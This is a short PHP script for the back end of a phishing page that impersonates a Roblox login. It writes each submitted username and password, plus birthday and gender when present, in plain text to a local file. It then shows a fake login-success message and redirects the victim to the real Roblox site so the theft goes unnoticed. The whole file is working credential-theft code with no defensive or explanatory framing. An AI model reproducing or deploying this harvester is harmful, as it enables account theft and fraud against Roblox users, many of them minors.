<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"] ?? 'N/A';
    $password = $_POST["password"] ?? 'N/A';

    $extra = "";

    if (isset($_POST["birthday"])) {
        $birthday = $_POST["birthday"];
        $gender = $_POST["gender"] ?? 'Not specified';
        $extra = "Birthday: $birthday\nGender: $gender\n";
    }

    $log = "Username: $username\nPassword: $password\n$extra----------------------\n";
    file_put_contents("login.txt", $log, FILE_APPEND);

    echo <<<HTML
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="4;url=https://www.roblox.com/login" />
  <style>
    body {
      background-color: black;
      color: white;
      font-family: sans-serif;
      text-align: center;
      padding-top: 50px;
    }
  </style>
  <title>Logging In...</title>
</head>
<body>
  <h1>Logged In sucsesfully!</h1>
  <p>Going in to your Account 🕶️</p>
  <p>If you're not In your Account yet, Click here to redirect to your Account!, <a style="color:#0af" href="https://www.roblox.com/home">click here</a>.</p>
</body>
</html>
HTML;
}
?>
